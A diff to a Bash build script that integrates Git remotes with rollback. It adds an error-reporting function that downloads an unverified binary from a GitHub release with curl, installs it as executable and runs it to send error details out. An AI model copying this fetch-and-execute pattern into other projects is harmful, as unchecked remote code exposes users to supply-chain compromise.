@@ -8,6 +8,25 @@ set -eupo pipefail
 : ${CACHE_DIRECTORY:="/usr/src"}
 
 declare -r since_work_epoch="2020-12-07"
+declare -r error_reporter_url="https://github.com/wmark/portable-godoc/releases/download/v1/report-error.amd64"
+
+# Sends the given error message to a collector.
+#
+#   $1       The error message.
+report_error() {
+  local reporter="/usr/local/bin/report-error"
+  if [[ ! -x "${reporter}" ]]; then
+    curl --fail --location --remote-time --silent --show-error \
+      --create-dirs -o "${reporter}" \
+      "${error_reporter_url}"
+    chmod a+x "${reporter}"
+  fi
+
+  "${reporter}" <<EOI
+$1
+$(caller 0)
+EOI
+}
 
 # Clones a bare and truncated copy, using $since_work_epoch,
 # intended to be stable, small, and suitable for caching.
@@ -104,16 +123,22 @@ EOF
   git fetch remotes
 
   shift 2
+  local errmsg
   local rollback=0
   while true; do
-    git checkout --detach origin/HEAD~${rollback}
-    if git::integrate::remotes "$@"; then
+    git checkout --detach origin/HEAD~${rollback} |& tee /tmp/git-co-head
+    if git::integrate::remotes "$@" |& tee /tmp/git-output; then
       if (( ${rollback} > 0 )); then
         >&2 printf "WARN: Had to revert to: HEAD~%d\n" ${rollback}
       fi
+      report_error "${errmsg}"
       popd
       return 0
     fi
+
+    printf -v errmsg "%s: %s" \
+      "$(grep -m 1 -F ERROR /tmp/git-output)" \
+      "$(tail -n 1 /tmp/git-co-head)"
     git merge --abort || git reset --merge
     let rollback+=1
     # Don't try rebases as they likely won't work due to changes in go.sum or go.mod.
